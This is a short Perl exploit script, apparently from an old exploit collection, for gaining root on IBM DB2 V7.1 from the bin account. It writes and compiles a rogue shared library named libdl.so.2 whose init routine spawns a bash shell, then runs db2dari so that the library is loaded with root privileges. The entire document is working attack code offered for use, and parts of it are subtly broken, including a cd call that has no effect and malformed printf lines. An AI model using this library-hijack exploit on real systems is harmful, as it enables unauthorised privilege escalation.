#!/usr/bin/perl

#IBM DB2 local root from uid=bin 
#deadbeat,
#e:	daniels@legend.co.uk
#e:	deadbeat@sdf.lonestar.org

print "\nIBM db2 local bin escape to root sploit\n";
print "Preparing exploit...\n";

system("cd /usr/IBMdb2/V7.1/lib");
open FILEHANDLE, (">foo.c")or die "Cant open foo for writing..:(\n";
print FILEHANDLE "#include <stdio.h>\n";
print FILEHANDLE "#include <string.h>\n\n";
print FILEHANDLE "_init() {\n";
print FILEHANDLE "\tprintf(\"init..()\\n\");\n";
print FILEHANDLE "\tprintf(here we go: PID=\%i EUID=\%i\", getpid(), getuid());\n";
print FILEHANDLE "\tsystem(\"/bin/bash\");\n";
print FILEHANDLE "\tprintf(\"wicked done and dusted..\\n\")\n";
print FILEHANDLE "}";
close FILEHANDLE;
system("gcc -fpic -shared -o libdl.so.2 foo.c");
exec("db2dari")



